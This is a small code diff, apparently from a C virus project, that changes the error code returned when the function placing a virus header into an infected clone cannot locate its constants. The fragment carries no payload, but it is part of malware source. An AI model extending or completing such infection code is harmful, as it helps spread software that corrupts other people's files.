@@ -49,7 +49,7 @@ bool		setup_virus_header(struct safe_ptr clone_ref, \
 
 	void	*constants_location = safe(clone_ref, virus_header_off, sizeof(vhdr));
 
-	if (!constants_location) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);
+	if (!constants_location) return errors(ERR_VIRUS, _ERR_V_CANT_READ_CONSTANTS);
 
 	memcpy(constants_location, &vhdr, sizeof(vhdr));
 
